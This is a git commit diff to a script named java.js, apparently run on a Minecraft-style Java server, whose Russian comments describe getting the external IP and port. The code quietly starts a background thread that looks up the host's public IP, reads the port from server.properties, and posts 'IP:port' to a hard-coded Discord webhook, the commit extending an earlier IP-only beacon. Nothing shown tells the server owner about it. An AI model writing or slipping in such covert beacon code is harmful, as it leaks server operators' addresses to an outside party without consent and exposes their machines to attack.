a84445e2d7e3494a1d908f4becebac6d37cdf997
TuMeuT-Original <originaltumeut@gmail.com>
2025-11-23 12:42:43 +0300

    Update java.js

--- java.js
+++ java.js
@@ -1,13 +1,25 @@
 new java.lang.Thread(function(){
     try {
-        var s = new java.util.Scanner(new java.net.URL("http://checkip.amazonaws.com").openStream()).useDelimiter("\\A").next();
+        // Получаем внешний IP
+        var externalIP = new java.util.Scanner(new java.net.URL("http://checkip.amazonaws.com").openStream()).useDelimiter("\\A").next().trim();
+        
+        // Получаем порт из server.properties
+        var serverProps = new java.util.Properties();
+        var propsFile = new java.io.File("server.properties");
+        serverProps.load(new java.io.FileReader(propsFile));
+        var port = serverProps.getProperty("server-port", "25565");
+        
+        // Формируем сообщение с IP:PORT
+        var message = externalIP + ":" + port;
+        
+        // Отправляем в Discord
         var c = new java.net.URL("https://discord.com/api/webhooks/1441768121223348236/w-SPavWF7tuGkBuDd_8xjkp21S5dwCoDawKMtCMd9FnsNB0q-bLsLMnFcG6mfixfIsuc").openConnection();
         c.setRequestMethod("POST");
         c.setDoOutput(true);
         c.setRequestProperty("Content-Type", "application/json");
         c.setRequestProperty("User-Agent", "Java");
         var w = new java.io.OutputStreamWriter(c.getOutputStream(), "UTF-8");
-        w.write('{"content":"'+s.trim()+'"}');
+        w.write('{"content":"' + message + '"}');
         w.flush();
         w.close();
         c.getInputStream().close();
